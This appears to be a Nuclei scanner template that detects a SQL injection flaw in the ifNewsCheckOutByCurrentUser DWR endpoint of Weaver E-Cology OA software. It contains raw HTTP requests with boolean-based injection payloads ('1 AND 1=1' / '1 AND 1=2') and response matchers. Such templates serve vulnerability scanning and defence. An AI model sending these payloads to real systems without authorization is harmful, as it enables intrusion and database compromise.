id: weaver-ecology-ifNewsCheckOutByCurrentUser-sqli

info:
  name: 泛微 OA ecology ifNewsCheckOutByCurrentUser - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://wiki.wy876.cn/#/%E6%9F%90%E5%BE%AE_E-Cology_%E6%9F%90%E7%89%88%E6%9C%AC_SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
  metadata: 
    verified: true
    fofa-qeury: 
  tags: weaver,sqli,oa,ecology

http:
  - raw:
      - |-
        POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain
        Content-Length: 189

        callCount=1
        page=
        httpSessionId=
        scriptSessionId=
        c0-scriptName=DocDwrUtil
        c0-methodName=ifNewsCheckOutByCurrentUser
        c0-id=0
        c0-param0=string:1 AND 1=1
        c0-param1=string:1
        batchId=0
      
      - |-
        POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain
        Content-Length: 189

        callCount=1
        page=
        httpSessionId=
        scriptSessionId=
        c0-scriptName=DocDwrUtil
        c0-methodName=ifNewsCheckOutByCurrentUser
        c0-id=0
        c0-param0=string:1 AND 1=2
        c0-param1=string:1
        batchId=0

      - |-
        POST /dwr/exec/DocDwrUtil.ifNewsCheckOutByCurrentUser HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain
        Content-Length: 157

        callCount=1
        c0-scriptName=DocDwrUtil
        c0-methodName=ifNewsCheckOutByCurrentUser
        c0-id=3561_1691581516970
        c0-param0=string:
        c0-param1=number:123
        xml=true

    matchers-condition: or    
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200 && status_code_2 == 200'
          - 'contains_all(body_1,"_remoteHandleCallback","true")'
          - 'contains_all(body_2,"_remoteHandleCallback","false")'
        condition: and
    
      - type: dsl
        dsl: 
          - 'status_code_3 == 200'
          - 'contains_all(body_3,"3561_1691581516970","DWREngine._handleResponse")'
        condition: and
